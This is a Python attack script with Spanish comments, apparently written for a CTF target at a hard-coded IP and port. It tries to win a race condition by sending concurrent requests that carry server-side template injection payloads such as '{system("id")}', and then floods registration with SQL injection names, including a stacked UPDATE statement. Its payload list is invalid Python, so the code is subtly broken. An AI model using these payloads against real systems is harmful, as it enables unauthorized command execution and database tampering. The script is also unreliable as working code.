#!/usr/bin/env python3
"""
Intentar race condition más agresiva
"""
import requests
import random
import string
import threading
import time

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Crear usuario
session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Intentar race condition con múltiples requests a edit simultáneamente
print("[*] Intentando race condition con múltiples edit requests...")

def send_edit_request(payload):
    try:
        session.post(f"{TARGET}/", data={'action': 'edit', 'new_name': payload}, timeout=5)
    except:
        pass

# Enviar muchas requests simultáneas con diferentes payloads
payloads = ['{7*7}', 'HACKED', '{system("id")}', 'PAYLOAD{$i}' for i in range(20)]

threads = []
for payload in payloads:
    t = threading.Thread(target=send_edit_request, args=(payload,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

time.sleep(1)

# Verificar nombre
resp = session.get(f"{TARGET}/")
import re
match = re.search(r'Yo, ([^<]+)</h2>', resp.text)
if match:
    name = match.group(1)
    print(f"[*] Nombre después de race: {name}")
    if name != 'user1':
        print(f"[+++] ¡El nombre cambió! Algo funcionó")
        if '49' in resp.text:
            print(f"[+++] SSTI ejecutado!")

# Intentar race condition con registro y login simultáneos
print("\n[*] Intentando race con registro/login...")

def register_user(name):
    s = requests.Session()
    u = random_string()
    try:
        s.post(f"{TARGET}/register.php", data={'name': name, 'username': u, 'password': 'pass'}, timeout=5)
    except:
        pass

names_with_sqli = [
    "test' OR '1'='1",
    "admin' --",
    "test'; UPDATE users SET name='HACKED' WHERE id=1; --"
]

threads = []
for name in names_with_sqli * 10:  # 30 threads
    t = threading.Thread(target=register_user, args=(name,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()

print("[*] Race condition completado")
